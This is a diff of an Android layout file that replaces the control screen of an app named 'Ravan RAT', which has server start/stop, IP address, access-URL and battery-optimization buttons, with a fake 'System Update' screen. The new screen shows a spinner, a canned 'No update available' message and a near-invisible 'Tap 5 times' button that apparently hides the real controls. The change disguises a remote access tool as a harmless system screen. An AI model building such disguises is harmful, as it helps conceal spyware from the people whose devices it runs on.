@@ -5,169 +5,91 @@
     xmlns:tools="http://schemas.android.com/tools"
     android:layout_width="match_parent"
     android:layout_height="match_parent"
-    android:background="@drawable/gradient_background"
+    android:background="#000000"
     tools:context=".MainActivity">
 
-    <ScrollView
-        android:layout_width="match_parent"
-        android:layout_height="match_parent"
-        android:fillViewport="true">
+    <!-- Centered content -->
+    <LinearLayout
+        android:id="@+id/centerContent"
+        android:layout_width="0dp"
+        android:layout_height="wrap_content"
+        android:orientation="vertical"
+        android:gravity="center"
+        android:padding="24dp"
+        app:layout_constraintTop_toTopOf="parent"
+        app:layout_constraintStart_toStartOf="parent"
+        app:layout_constraintEnd_toEndOf="parent"
+        app:layout_constraintBottom_toBottomOf="parent">
 
-        <LinearLayout
-            android:layout_width="match_parent"
+        <TextView
+            android:layout_width="wrap_content"
             android:layout_height="wrap_content"
-            android:orientation="vertical"
-            android:padding="24dp">
+            android:text="System Update"
+            android:textSize="28sp"
+            android:textColor="#FFFFFF"
+            android:textStyle="bold"
+            android:layout_marginBottom="24dp"
+            android:textAlignment="center"/>
 
-            <!-- Header -->
-            <LinearLayout
-                android:layout_width="match_parent"
-                android:layout_height="wrap_content"
-                android:orientation="vertical"
-                android:gravity="center"
-                android:layout_marginBottom="32dp"
-                android:layout_marginTop="40dp">
+        <!-- Loading Spinner -->
+        <ProgressBar
+            android:id="@+id/progressBar"
+            android:layout_width="48dp"
+            android:layout_height="48dp"
+            android:layout_marginBottom="24dp"
+            android:indeterminate="true"
+            style="?android:attr/progressBarStyle"/>
 
-                <TextView
-                    android:layout_width="wrap_content"
-                    android:layout_height="wrap_content"
-                    android:text="🛡️"
-                    android:textSize="64sp"
-                    android:layout_marginBottom="16dp"/>
+        <!-- Status Text -->
+        <TextView
+            android:id="@+id/tvStatus"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="Checking for updates..."
+            android:textSize="18sp"
+            android:textColor="#FFFFFF"
+            android:textAlignment="center"
+            android:layout_marginBottom="32dp"/>
 
-                <TextView
-                    android:layout_width="wrap_content"
-                    android:layout_height="wrap_content"
-                    android:text="Ravan RAT"
-                    android:textSize="32sp"
-                    android:textColor="#E94560"
-                    android:textStyle="bold"/>
+        <!-- Hidden message (shown after 2 seconds) -->
+        <TextView
+            android:id="@+id/tvUpdateResult"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="No update available. Your device is up to date."
+            android:textSize="16sp"
+            android:textColor="#FFFFFF"
+            android:textAlignment="center"
+            android:visibility="gone"
+            android:layout_marginBottom="24dp"/>
 
-            </LinearLayout>
+    </LinearLayout>
 
-            <!-- Status Card -->
-            <androidx.cardview.widget.CardView
-                android:layout_width="match_parent"
-                android:layout_height="wrap_content"
-                app:cardBackgroundColor="#1E1E2E"
-                app:cardCornerRadius="16dp"
-                app:cardElevation="8dp"
-                android:layout_marginBottom="16dp">
+    <!-- Version Info at bottom -->
+    <TextView
+        android:id="@+id/tvVersion"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:text="System Update v1.0"
+        android:textSize="13sp"
+        android:textColor="#888888"
+        android:textAlignment="center"
+        app:layout_constraintStart_toStartOf="parent"
+        app:layout_constraintEnd_toEndOf="parent"
+        app:layout_constraintBottom_toBottomOf="parent"
+        android:layout_marginBottom="16dp"/>
 
-                <LinearLayout
-                    android:layout_width="match_parent"
-                    android:layout_height="wrap_content"
-                    android:orientation="vertical"
-                    android:padding="20dp">
-
-                    <TextView
-                        android:id="@+id/tvStatus"
-                        android:layout_width="wrap_content"
-                        android:layout_height="wrap_content"
-                        android:text="🔴 Server Stopped"
-                        android:textSize="22sp"
-                        android:textColor="#E74C3C"
-                        android:textStyle="bold"
-                        android:layout_gravity="center"
-                        android:layout_marginBottom="16dp"/>
-
-                    <View
-                        android:layout_width="match_parent"
-                        android:layout_height="1dp"
-                        android:background="#333333"
-                        android:layout_marginBottom="16dp"/>
-
-                    <TextView
-                        android:layout_width="wrap_content"
-                        android:layout_height="wrap_content"
-                        android:text="Network Information"
-                        android:textSize="12sp"
-                        android:textColor="#888888"
-                        android:textAllCaps="true"
-                        android:letterSpacing="0.1"/>
-
-                    <TextView
-                        android:id="@+id/tvIpAddress"
-                        android:layout_width="match_parent"
-                        android:layout_height="wrap_content"
-                        android:text="IPv6: Loading..."
-                        android:textSize="14sp"
-                        android:textColor="#FFFFFF"
-                        android:layout_marginTop="8dp"
-                        android:fontFamily="monospace"/>
-
-                    <TextView
-                        android:layout_width="wrap_content"
-                        android:layout_height="wrap_content"
-                        android:text="Access URL"
-                        android:textSize="12sp"
-                        android:textColor="#888888"
-                        android:textAllCaps="true"
-                        android:letterSpacing="0.1"
-                        android:layout_marginTop="16dp"/>
-
-                    <TextView
-                        android:id="@+id/tvServerUrl"
-                        android:layout_width="match_parent"
-                        android:layout_height="wrap_content"
-                        android:text="Not running"
-                        android:textSize="13sp"
-                        android:textColor="#E94560"
-                        android:layout_marginTop="8dp"
-                        android:fontFamily="monospace"
-                        android:padding="12dp"
-                        android:background="@drawable/url_background"/>
-
-                </LinearLayout>
-
-            </androidx.cardview.widget.CardView>
-
-            <!-- Action Buttons -->
-            <Button
-                android:id="@+id/btnStartStop"
-                android:layout_width="match_parent"
-                android:layout_height="56dp"
-                android:text="Start Server"
-                android:textSize="16sp"
-                android:textStyle="bold"
-                android:textColor="#FFFFFF"
-                android:backgroundTint="#2ECC71"
-                app:cornerRadius="12dp"
-                android:layout_marginBottom="12dp"/>
-
-            <Button
-                android:id="@+id/btnCopyUrl"
-                android:layout_width="match_parent"
-                android:layout_height="48dp"
-                android:text="📋 Copy URL to Clipboard"
-                android:textSize="14sp"
-                android:textColor="#FFFFFF"
-                android:backgroundTint="#3498DB"
-                app:cornerRadius="12dp"
-                android:layout_marginBottom="12dp"/>
-
-            <Button
-                android:id="@+id/btnBatteryOptimization"
-                android:layout_width="match_parent"
-                android:layout_height="48dp"
-                android:text="🔋 Disable Battery Optimization"
-                android:textSize="14sp"
-                android:textColor="#FFFFFF"
-                android:backgroundTint="#9B59B6"
-                app:cornerRadius="12dp"
-                android:layout_marginBottom="24dp"/>
-
-            <TextView
-                android:layout_width="wrap_content"
-                android:layout_height="wrap_content"
-                android:text="v1.5 • Port 8080"
-                android:textSize="12sp"
-                android:textColor="#666666"
-                android:layout_gravity="center"
-                android:layout_marginTop="24dp"/>
-
-        </LinearLayout>
-
-    </ScrollView>
+    <Button
+        android:id="@+id/btnOpenNotificationSettings"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:text="Tap 5 times"
+        android:textSize="10sp"
+        android:textColor="#666666"
+        android:background="@android:color/transparent"
+        app:layout_constraintBottom_toBottomOf="parent"
+        app:layout_constraintStart_toStartOf="parent"
+        app:layout_constraintEnd_toEndOf="parent"
+        android:layout_marginBottom="60dp"/>
 
 </androidx.constraintlayout.widget.ConstraintLayout>
